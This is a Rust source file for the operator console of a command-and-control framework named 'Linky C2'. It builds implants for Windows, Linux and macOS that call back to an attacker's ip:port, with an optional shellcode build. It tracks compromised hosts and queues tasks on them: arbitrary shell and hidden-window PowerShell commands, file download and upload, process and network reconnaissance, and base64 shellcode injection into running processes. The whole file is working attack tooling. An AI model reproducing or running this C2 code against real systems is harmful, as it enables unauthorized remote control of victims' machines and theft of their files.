use chrono::Local;
use colored::Colorize;
use rustyline::{error::ReadlineError, DefaultEditor};
use std::sync::{Arc, Mutex};
use uuid::Uuid;

use crate::links::{LinkStatus, Links};
use crate::tasks::TaskStatus;
use crate::ui;

pub fn run(links: Arc<Mutex<Links>>) {
    ui::print_bold("Linky C2 – type 'help' for commands\n");

    let mut rl = DefaultEditor::new().expect("readline init failed");

    loop {
        match rl.readline("linky> ") {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                rl.add_history_entry(&line).ok();

                let (cmd, rest) = split_first(&line);
                match cmd {
                    "links" => links_menu(&links, &mut rl),
                    "generate" => {
                        if rest.is_empty() {
                            ui::print("Usage: generate <ip:port> [--shellcode]");
                        } else {
                            let (callback, shellcode) = parse_generate_args(rest);
                            crate::generate::generate_windows(&callback, shellcode);
                        }
                    }
                    "generate-linux" => {
                        if rest.is_empty() {
                            ui::print("Usage: generate-linux <ip:port> [--shellcode]");
                        } else {
                            let (callback, shellcode) = parse_generate_args(rest);
                            crate::generate::generate_linux(&callback, shellcode);
                        }
                    }

                    "generate-osx" => {
                        if rest.is_empty() {
                            ui::print("Usage: generate-osx <ip:port> [--shellcode]");
                        } else {
                            let (callback, shellcode) = parse_generate_args(rest);
                            crate::generate::generate_osx(&callback, shellcode);
                        }
                    }
                    "help" => print_help(),
                    "exit" | "quit" | "kill" => {
                        ui::print("Exiting.");
                        std::process::exit(0);
                    }
                    _ => ui::print(&format!("Unknown command '{}'. Type 'help'.", cmd)),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => {
                ui::print("\nExiting.");
                std::process::exit(0);
            }
            Err(e) => tracing::error!("readline error: {}", e),
        }
    }
}

// ── Links submenu ────────────────────────────────────────────────────────────

fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
    ui::print_cyan_bold("\n╔══════════════════════════════╗");
    ui::print_cyan_bold("║          LINKS MENU          ║");
    ui::print_cyan_bold("╚══════════════════════════════╝\n");
    print_links_table(links);

    loop {
        match rl.readline("\x01\x1b[31m\x02links> \x01\x1b[0m\x02") {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                rl.add_history_entry(&line).ok();
                let (cmd, rest) = split_first(&line);

                match cmd {
                    "-h" | "help" => {
                        ui::print(&format!(
                            "  {}          Show all links (including inactive)",
                            "-a".yellow()
                        ));
                        ui::print(&format!(
                            "  {}   Interact with a link",
                            "-i <name>".yellow()
                        ));
                        ui::print(&format!(
                            "  {}   Send kill task + mark exited",
                            "-k <name>".yellow()
                        ));
                        ui::print(&format!("  {}        Return to main menu", "back".yellow()));
                    }
                    "-a" => print_links_table(links),
                    "-i" => {
                        if rest.is_empty() {
                            ui::print("Usage: -i <name>");
                        } else if let Some(id) = resolve_link(links, rest) {
                            interact(links, id, rl);
                        } else {
                            ui::print(&format!("{} Link not found: {}", "[-]".red(), rest));
                        }
                    }
                    "-k" => {
                        if rest.is_empty() {
                            ui::print("Usage: -k <name>");
                        } else if let Some(id) = resolve_link(links, rest) {
                            let mut l = links.lock().unwrap_or_else(|e| e.into_inner());
                            l.add_task(id, "exit".into(), "kill".into());
                            l.kill_link(id);
                            ui::print(&format!("{} Kill task queued.", "[+]".green()));
                        } else {
                            ui::print(&format!("{} Link not found: {}", "[-]".red(), rest));
                        }
                    }
                    "back" | "exit" | "q" => break,
                    "generate" | "generate-linux" | "generate-osx" | "links" | "kill" | "quit" => {
                        ui::print(&format!(
                            "'{}' is a top-level command. Type 'back' to return to the main menu first.",
                            cmd
                        ));
                    }
                    _ => ui::print(&format!("Unknown command '{}'. Type -h for help.", cmd)),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
            Err(e) => tracing::error!("readline: {}", e),
        }
    }
}

fn print_links_table(links: &Arc<Mutex<Links>>) {
    let links = links.lock().unwrap_or_else(|e| e.into_inner());
    let all = links.all_links();
    if all.is_empty() {
        ui::print(&format!("{} No links registered.", "[*]".cyan()));
        return;
    }
    ui::print(&format!(
        "\n{}",
        format!(
            "{:<12} {:<24} {:<18} {:<12} {:<10}",
            "Name", "User@Host", "IP", "Platform", "Status"
        )
        .cyan()
        .bold()
    ));
    ui::print(&format!("{}", "─".repeat(78).cyan()));
    for l in all {
        let status = status_colored(&l.status);
        ui::print(&format!(
            "{:<12} {:<24} {:<18} {:<12} {}",
            l.name,
            format!("{}@{}", l.username, l.hostname),
            l.internal_ip,
            l.platform,
            status,
        ));
    }
}

// ── Per-link interaction ─────────────────────────────────────────────────────

fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
    {
        let l = links.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(link) = l.get_link(link_id) {
            ui::print(&format!(
                "\n{} Interacting with {} – {}@{} [{}]",
                "[*]".cyan(),
                link.name.bold(),
                link.username,
                link.hostname,
                link.platform.yellow()
            ));
            ui::print("    Type 'help' for commands, 'back' to return\n");
        }
    }

    loop {
        // Display results of completed tasks before showing prompt
        show_completed_task_results(links, link_id);

        let prompt = {
            let l = links.lock().unwrap_or_else(|e| e.into_inner());
            l.get_link(link_id)
                .map(|lk| {
                    let os_tag = match lk.platform.as_str() {
                        "windows" => "win",
                        p if p.contains("linux")
                            || p.contains("Linux")
                            || p.contains("Ubuntu")
                            || p.contains("Debian")
                            || p.contains("Fedora")
                            || p.contains("CentOS") =>
                        {
                            "lnx"
                        }
                        p if p.contains("macOS") || p.contains("Mac") => "osx",
                        _ => "???",
                    };
                    format!("{}|{}> ", lk.name, os_tag)
                })
                .unwrap_or_else(|| "link> ".into())
        };

        match rl.readline(&prompt) {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                rl.add_history_entry(&line).ok();
                let (cmd, args) = split_first(&line);

                match cmd {
                    "help" => {
                        let platform = links
                            .lock()
                            .unwrap_or_else(|e| e.into_inner())
                            .get_link(link_id)
                            .map(|l| l.platform.clone())
                            .unwrap_or_default();
                        print_link_help(&platform);
                    }
                    "back" | "exit" => break,
                    "info" => show_info(links, link_id),
                    "kill" => {
                        let mut l = links.lock().unwrap_or_else(|e| e.into_inner());
                        l.add_task(link_id, "exit".into(), "kill".into());
                        l.kill_link(link_id);
                        ui::print(&format!("{} Kill task queued.", "[+]".green()));
                        break;
                    }

                    // ── Shell execution helpers ──────────────────────────
                    "cmd" => {
                        if !is_windows(links, link_id) {
                            ui::print(&format!("{} 'cmd' is a Windows-only command.", "[-]".red()));
                        } else {
                            queue(links, link_id, format!("cmd /C {}", args), line.clone());
                        }
                    }
                    "shell" => queue(links, link_id, line.clone(), line.clone()),
                    "powershell" => {
                        if !is_windows(links, link_id) {
                            ui::print(&format!(
                                "{} 'powershell' is a Windows-only command.",
                                "[-]".red()
                            ));
                        } else {
                            queue(
                                links,
                                link_id,
                                format!("powershell -noP -sta -w 1 -c \"{}\"", args),
                                line.clone(),
                            );
                        }
                    }
                    "ps" => queue(links, link_id, "ps".into(), line.clone()),

                    // ── Built-in navigation ─────────────────────────────
                    "cd" | "pwd" | "ls" | "whoami" | "pid" => {
                        queue(links, link_id, line.clone(), line.clone())
                    }
                    "integrity" => {
                        if !is_windows(links, link_id) {
                            ui::print(&format!(
                                "{} 'integrity' is a Windows-only command.",
                                "[-]".red()
                            ));
                        } else {
                            queue(links, link_id, line.clone(), line.clone());
                        }
                    }
                    "netstat" => queue(links, link_id, "netstat".into(), line.clone()),

                    // ── File operations ─────────────────────────────────
                    "download" => {
                        if args.is_empty() {
                            ui::print("Usage: download <remote_path>");
                        } else {
                            let mut l = links.lock().unwrap_or_else(|e| e.into_inner());
                            if let Some(id) = l.get_link(link_id).map(|link| link.id) {
                                l.add_download_task(id, args.to_string());
                                ui::print(&format!("{} Download task queued.", "[+]".green()));
                            }
                        }
                    }
                    "upload" => match parse_upload_args(args) {
                        None => ui::print(
                            "Usage: upload <local_path> <remote_path>  \
                                (quote paths with spaces: \"path/to file\" /remote/dest)",
                        ),
                        Some((local_path, remote_path)) => {
                            let mut l = links.lock().unwrap_or_else(|e| e.into_inner());
                            if let Some(id) = l.get_link(link_id).map(|link| link.id) {
                                if l.add_upload_task(id, local_path, remote_path).is_some() {
                                    ui::print(&format!("{} Upload task queued.", "[+]".green()));
                                } else {
                                    ui::print(&format!(
                                        "{} Failed to read local file.",
                                        "[-]".red()
                                    ));
                                }
                            }
                        }
                    },

                    // ── Process injection ───────────────────────────────
                    "inject" => {
                        if !is_windows(links, link_id) {
                            ui::print(&format!(
                                "{} 'inject' is a Windows-only command.",
                                "[-]".red()
                            ));
                        } else {
                            queue(links, link_id, line.clone(), line.clone());
                        }
                    }

                    // ── Catch-all: send raw ─────────────────────────────
                    _ => queue(links, link_id, line.clone(), line.clone()),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
            Err(e) => tracing::error!("readline: {}", e),
        }
    }
}

pub fn show_completed_task_results(links: &Arc<Mutex<Links>>, link_id: Uuid) {
    let mut l = links.lock().unwrap_or_else(|e| e.into_inner());
    let Some(link) = l.get_link_mut(link_id) else {
        return;
    };
    let link_name = link.name.clone();

    for task in &mut link.tasks {
        if task.status == TaskStatus::Completed && !task.displayed {
            const MIN_BOX_WIDTH: usize = 54;
            let now = Local::now().format("%H:%M:%S");
            let header_text = format!("═ {} · {} · {} ", link_name, task.cli_command, now);
            let box_width = header_text.chars().count().max(MIN_BOX_WIDTH);
            let pad = box_width - header_text.chars().count();

            if task.output.is_empty() {
                ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
                ui::print(&format!("║ {} (no output)", task.cli_command));
                ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(box_width)));
            } else {
                ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
                ui::print(&format!("║ {}", task.output));
                ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(box_width)));
            }

            task.displayed = true;
        }
    }
}

fn show_info(links: &Arc<Mutex<Links>>, link_id: Uuid) {
    let l = links.lock().unwrap_or_else(|e| e.into_inner());
    if let Some(link) = l.get_link(link_id) {
        ui::print(&format!("  Name      : {}", link.name));
        ui::print(&format!("  ID        : {}", link.id));
        ui::print(&format!(
            "  User      : {}@{}",
            link.username, link.hostname
        ));
        ui::print(&format!("  Internal  : {}", link.internal_ip));
        ui::print(&format!("  External  : {}", link.external_ip));
        ui::print(&format!("  Platform  : {}", link.platform));
        ui::print(&format!("  PID       : {}", link.pid));
        ui::print(&format!(
            "  First seen: {}",
            link.first_checkin.format("%Y-%m-%d %H:%M:%S")
        ));
        ui::print(&format!(
            "  Last seen : {}",
            link.last_checkin.format("%Y-%m-%d %H:%M:%S")
        ));
        ui::print(&format!(
            "  {}    : {}",
            "Status".cyan(),
            status_colored(&link.status)
        ));
    }
}

fn is_windows(links: &Arc<Mutex<Links>>, link_id: Uuid) -> bool {
    links
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get_link(link_id)
        .map(|l| l.platform == "windows")
        .unwrap_or(false)
}

fn queue(links: &Arc<Mutex<Links>>, link_id: Uuid, command: String, cli_cmd: String) {
    let mut l = links.lock().unwrap_or_else(|e| e.into_inner());
    l.add_task(link_id, command, cli_cmd);
}

fn resolve_link(links: &Arc<Mutex<Links>>, name: &str) -> Option<Uuid> {
    links
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get_link_by_name(name)
        .map(|l| l.id)
}

// ── Helpers ──────────────────────────────────────────────────────────────────

fn status_colored(status: &LinkStatus) -> String {
    match status {
        LinkStatus::Active => "Active".green().bold().to_string(),
        LinkStatus::Inactive => "Inactive".yellow().to_string(),
        LinkStatus::Exited => "Exited".red().to_string(),
    }
}

// Note : cette fonction est dupliquée depuis links/common/src/lib.rs.
// Le serveur ne dépend pas de link-common → duplication structurelle intentionnelle.
// Tout changement ici doit être répercuté dans link-common::split_first et vice-versa.

/// Split "cmd rest…" → ("cmd", "rest…").
fn split_first(s: &str) -> (&str, &str) {
    match s.find(' ') {
        Some(i) => (&s[..i], s[i + 1..].trim_start()),
        None => (s, ""),
    }
}

/// Parse upload arguments: `"local path" /remote` or `local /remote`.
/// Returns `Some((local, remote))` or `None` if the format is invalid.
fn parse_upload_args(args: &str) -> Option<(String, String)> {
    let args = args.trim();
    if args.is_empty() {
        return None;
    }
    if let Some(rest) = args.strip_prefix('"') {
        // Quoted local path: "path with spaces" /remote/dest
        let end = rest.find('"')?;
        let local = rest[..end].to_string();
        let remote = rest[end + 1..].trim().to_string();
        if remote.is_empty() {
            return None;
        }
        Some((local, remote))
    } else {
        // Unquoted: first whitespace-delimited token is the local path
        let i = args.find(char::is_whitespace)?;
        let local = args[..i].to_string();
        let remote = args[i..].trim_start().to_string();
        if remote.is_empty() {
            return None;
        }
        Some((local, remote))
    }
}

/// Parse "10.0.0.1:8443 --shellcode" → ("10.0.0.1:8443", true)
/// Parse "10.0.0.1:8443"             → ("10.0.0.1:8443", false)
fn parse_generate_args(args: &str) -> (String, bool) {
    let parts: Vec<&str> = args.split_whitespace().collect();
    let shellcode = parts.contains(&"--shellcode");
    let callback = parts
        .iter()
        .find(|p| !p.starts_with("--"))
        .map(|p| p.to_string())
        .unwrap_or_default();
    (callback, shellcode)
}

fn print_help() {
    ui::print("  links                                  Manage active links");
    ui::print("  generate <ip:port> [--shellcode]       Build Windows implant");
    ui::print("  generate-linux <ip:port> [--shellcode] Build Linux implant");
    ui::print("  generate-osx <ip:port> [--shellcode]   Build macOS implant");
    ui::print("  help                                   Show this help");
    ui::print("  exit / kill                            Quit linky");
    ui::print("");
    ui::print("  --shellcode   Produce minimal .bin via objcopy (Linux/macOS)");
    ui::print("                or PE copy (Windows — use sRDI/Donut for PIC).");
    ui::print("                Uses release-shellcode profile (panic=abort, lto).");
    ui::print("");
    ui::print("  LINKY_OUTPUT_DIR  Output directory for generated implants (default: .)");
}

fn print_link_help(platform: &str) {
    let is_win = platform == "windows";

    ui::print("  ── Execution ────────────────────────────────────────");
    ui::print("  shell <cmd>              Run via /bin/sh (Linux/macOS) or cmd.exe (Windows)");
    if is_win {
        ui::print("  cmd <args>               Execute via cmd.exe /C");
        ui::print("  powershell <args>        Execute via powershell.exe");
    }
    ui::print("  ── Navigation ───────────────────────────────────────");
    ui::print("  ls [path]                List directory");
    ui::print("  cd <path>                Change directory");
    ui::print("  pwd                      Print working directory");
    ui::print("  whoami                   Current user");
    ui::print("  pid                      Process ID");
    ui::print("  ── Reconnaissance ───────────────────────────────────");
    ui::print("  info                     Detailed system information");
    ui::print("  ps                       List running processes");
    ui::print("  netstat                  List network connections");
    ui::print("  ── File transfer ────────────────────────────────────");
    ui::print("  download <path>          Download file from implant");
    ui::print("  upload <local> <remote>  Upload file to implant");
    ui::print("  ── Operational ──────────────────────────────────────");
    ui::print("  sleep <s> [jitter%]      Set polling interval (e.g. sleep 30 20)");
    ui::print("  killdate <date|clear>    Set auto-exit date   (e.g. killdate 2026-12-31)");
    if is_win {
        ui::print("  ── Windows ──────────────────────────────────────────");
        ui::print("  integrity                Token integrity level");
        ui::print("  inject <pid> <b64>       Inject base64 shellcode into PID");
    }
    ui::print("  ── Session ──────────────────────────────────────────");
    ui::print("  kill                     Send exit + mark link dead");
    ui::print("  back                     Return to links menu");
}
